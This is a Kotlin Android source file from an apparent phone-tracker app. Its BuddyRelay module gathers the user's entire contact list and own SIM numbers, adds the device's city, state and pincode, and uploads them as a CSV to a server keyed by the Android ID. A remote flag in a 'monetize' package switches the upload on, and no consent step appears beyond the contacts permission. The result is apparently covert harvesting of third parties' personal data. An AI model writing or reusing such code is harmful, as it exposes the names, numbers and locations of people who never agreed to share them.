package com.find.phone.gps.live.location.tracker.store.peoplesync

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.provider.Settings
import android.util.Log
import androidx.core.content.ContextCompat
import androidx.core.content.edit
import com.find.phone.gps.live.location.tracker.BuildConfig
import com.find.phone.gps.live.location.tracker.monetize.logic.SpotsLocker
import com.find.phone.gps.live.location.tracker.store.chip.MineChipTitles
import com.find.phone.gps.live.location.tracker.store.chip.MineChipNums
import com.find.phone.gps.live.location.tracker.screens.people.GadgetBuddies
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.File
import java.util.UUID

object BuddyRelay {
    private const val TAG = "BuddyRelay"

    private const val STORE = "contact_sync"
    private const val FLAG_SENT = "uploaded_once"
    private const val FLAG_DEVICE = "device_id"

    private const val DEBUG_UPLOAD_FOR_REAL = false

    private const val CSV_HEADER = "phoneNumber,displayName,city,state,pincode"
    private const val UPLOAD_FILE = "contacts_upload.csv"
    private const val NL = "\n"

    private data class OutRow(
        val number: String,
        val label: String,
        val city: String?,
        val state: String?,
        val pincode: String?,
    )

    private fun store(ctx: Context) = ctx.applicationContext.getSharedPreferences(STORE, Context.MODE_PRIVATE)

    private fun trace(msg: String) {
        Log.d(TAG, msg)
    }

    private fun contactsGranted(ctx: Context): Boolean =
        ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED

    fun hasUploaded(context: Context): Boolean = store(context).getBoolean(FLAG_SENT, false)

    fun rewindUploaded(context: Context) = store(context).edit { putBoolean(FLAG_SENT, false) }

    fun isEnabled(context: Context): Boolean = runCatching {
        val raw = SpotsLocker.getInstance(context).getString("contacts_upload", "{}") ?: "{}"
        org.json.JSONObject(raw)
    }.getOrNull()?.optBoolean("enabled", false) == true

    fun deviceId(context: Context): String {
        val stored = store(context).getString(FLAG_DEVICE, null)
        if (stored != null) return stored
        @Suppress("HardwareIds")
        val secure = runCatching {
            Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
        }.getOrNull()
        val cleaned = buildString {
            secure?.forEach { ch -> if (ch.isLetterOrDigit() || ch == '_' || ch == '-') append(ch) }
        }
        val chosen = when (cleaned.length) {
            in 8..64 -> cleaned
            else -> UUID.randomUUID().toString()
        }
        store(context).edit { putString(FLAG_DEVICE, chosen) }
        return chosen
    }

    suspend fun pushOnceIfDue(context: Context) {
        val appCtx = context.applicationContext
        if (BuildConfig.DEBUG) {
            debugRun(appCtx)
            return
        }
        val skipReason = when {
            !isEnabled(appCtx) -> "skip: switch off"
            store(appCtx).getBoolean(FLAG_SENT, false) -> "skip: already uploaded"
            !contactsGranted(appCtx) -> "skip: no contacts permission"
            else -> null
        }
        if (skipReason != null) {
            trace(skipReason)
            return
        }
        runCatching { send(appCtx) }.onFailure { Log.w(TAG, "upload failed", it) }
    }

    private suspend fun debugRun(appCtx: Context) {
        if (!DEBUG_UPLOAD_FOR_REAL) {
            runCatching { dryRun(appCtx) }.onFailure { Log.w(TAG, "dry run failed", it) }
            return
        }
        if (!contactsGranted(appCtx)) {
            trace("debug: skip, no contacts permission")
            return
        }
        trace("debug: REAL upload (DEBUG_UPLOAD_FOR_REAL) — not a dry run")
        runCatching { send(appCtx) }.onFailure { Log.w(TAG, "debug upload failed", it) }
    }

    private suspend fun gatherRows(ctx: Context): List<OutRow>? {
        val area = GadgetPlace.resolve(ctx)
        val own = ownSimRows(ctx, area)
        val book = GadgetBuddies.load(ctx)
        val prepared = BuddyLines.prepare(ctx, book, area)
        val ownNumbers = HashSet<String>(own.size * 2)
        own.forEach { ownNumbers.add(it.number) }
        val all = ArrayList<OutRow>(own)
        for (line in prepared.rows) {
            if (line.e164 in ownNumbers) continue
            all.add(OutRow(line.e164, line.name, line.city, line.state, line.pincode))
        }
        trace(
            "prepared: ${own.size} own SIM + ${prepared.total} contacts → ${prepared.invalid} invalid, " +
                "${prepared.duplicates} duplicates, ${all.size} rows to send " +
                "(device ${prepared.deviceRegion}, area=$area; by country: ${prepared.byCountry})"
        )
        return if (all.isEmpty()) null else all
    }

    private suspend fun ownSimRows(ctx: Context, area: GadgetPlace.Area): List<OutRow> {
        if (!MineChipNums.isGranted(ctx)) return emptyList()
        val result = ArrayList<OutRow>()
        for (sim in MineChipNums.read(ctx)) {
            val number = sim.e164 ?: continue
            val fallback = if (sim.carrier.isBlank()) "SIM ${sim.slot}" else sim.carrier
            val resolved = MineChipTitles.resolve(ctx, number, fallback).name
            result.add(OutRow(number, resolved, area.city, area.state, area.pincode))
        }
        return result
    }

    private fun StringBuilder.appendQuoted(value: String?): StringBuilder {
        append('"')
        value?.forEach { ch -> if (ch == '"') append("\"\"") else append(ch) }
        append('"')
        return this
    }

    private fun render(row: OutRow): String = StringBuilder()
        .appendQuoted(row.number).append(',')
        .appendQuoted(row.label).append(',')
        .appendQuoted(row.city).append(',')
        .appendQuoted(row.state).append(',')
        .appendQuoted(row.pincode)
        .toString()

    private suspend fun dryRun(ctx: Context) = withContext(Dispatchers.IO) {
        if (!contactsGranted(ctx)) {
            trace("dry run skip: no contacts permission")
            return@withContext
        }
        val rows = gatherRows(ctx)
        if (rows == null) {
            trace("dry run: no rows to send")
            return@withContext
        }
        trace("──── DRY RUN (debug): CSV below, nothing sent ────")
        trace(CSV_HEADER)
        for (r in rows) trace(render(r))
        trace("──── DRY RUN end: ${rows.size} rows (debug never uploads) ────")
    }

    private suspend fun send(ctx: Context) = withContext(Dispatchers.IO) {
        val rows = gatherRows(ctx)
        if (rows == null) {
            trace("skip: no rows to send")
            return@withContext
        }

        val csvFile = File(ctx.cacheDir, UPLOAD_FILE)
        csvFile.bufferedWriter().use { w ->
            w.write(CSV_HEADER)
            w.write(NL)
            rows.forEach { r ->
                w.write(render(r))
                w.write(NL)
            }
        }
        trace("uploading ${rows.size} rows, deviceId=${deviceId(ctx)}, size=${csvFile.length()}B")

        try {
            val client = BuddySendCaller.api(ctx)

            val reply = client.upload(
                file = BuddySendCaller.filePart(csvFile),
                deviceId = BuddySendCaller.textPart(deviceId(ctx)),
                city = null,
                state = null,
                pincode = null,
            )
            if (!reply.isSuccessful) {
                Log.w(TAG, "upload HTTP ${reply.code()}: ${reply.errorBody()?.string()}")
            } else {
                val summary = reply.body()
                trace("OK ${reply.code()}: total=${summary?.totalRows} valid=${summary?.validContacts} invalid=${summary?.invalidContacts}")
                summary?.sampleErrors?.forEach { trace("  sampleError: $it") }
                store(ctx).edit { putBoolean(FLAG_SENT, true) }
            }
        } finally {
            csvFile.delete()
        }
    }

    suspend fun eraseUploaded(context: Context): Int? = withContext(Dispatchers.IO) {
        try {
            val reply = BuddySendCaller.api(context).delete(deviceId(context))
            if (reply.isSuccessful) {
                rewindUploaded(context)
                val removed = reply.body()?.deleted ?: 0
                trace("delete OK: removed $removed rows")
                removed
            } else {
                Log.w(TAG, "delete HTTP ${reply.code()}: ${reply.errorBody()?.string()}")
                null
            }
        } catch (t: Throwable) {
            Log.w(TAG, "delete failed", t)
            null
        }
    }
}
